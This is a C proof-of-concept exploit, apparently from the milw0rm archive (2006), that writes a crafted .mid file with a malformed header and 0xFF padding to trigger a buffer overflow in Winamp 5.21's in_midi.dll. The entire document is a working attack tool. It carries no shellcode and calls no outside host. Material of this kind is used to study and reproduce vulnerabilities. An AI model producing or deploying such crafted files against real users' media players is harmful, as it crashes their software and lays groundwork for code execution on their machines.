/*
 
 * ********************************************** *
 * Winamp 5.21 - Midi Buffer Overflow in_midi.dll *
 * ********************************************** *
 * PoC coded by: BassReFLeX                       *
 * Date: 19 Jun 2006                              *
 * ********************************************** *
 
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void usage(char* file);

char header[] = "\x4D\x54\x68\x64\x00\x00"
                "\x00\x06\x00\x00\x00\x01"
                "\x00\x60\x4D\x54\x72\x6B"
                "\x00\x00";

char badc0de[] = "\xFF\xFF\xFF\xFF\xFF\xFF"
		 "\xFF\xFF\xFF\xFF\xFF\xFF";
				
				 
				 
int main(int argc,char* argv[])
{
    system("cls");
    printf("\n* ********************************************** *");
    printf("\n* Winamp 5.21 - Midi Buffer Overflow in_midi.dll *");
    printf("\n* ********************************************** *");
    printf("\n* PoC coded by: BassReFLeX                       *");
    printf("\n* Date: 19 Jun 2006                              *");
    printf("\n* ********************************************** *");
    
    if ( argc!=2 )
    {
        usage(argv[0]);
    }
    
    FILE *f;
    f = fopen(argv[1],"w");
    if ( !f )
    {
        printf("\nFile couldn't open!");
        exit(1);
    }
    
                        
    printf("\n\nWriting crafted .mid file...");
    fwrite(header,1,sizeof(header),f);
    fwrite(badc0de,1,sizeof(badc0de),f);
    printf("\nFile created successfully!");
    printf("\nFile: %s",argv[1]);
    return 0;
}        

void usage(char* file)
{
    printf("\n\n");
    printf("\n%s <Filename>",file);
    printf("\n\nFilename = .mid crafted file. Example: winsploit.exe craftedsh1t.mid");
    exit(1);
}    

// milw0rm.com [2006-06-20]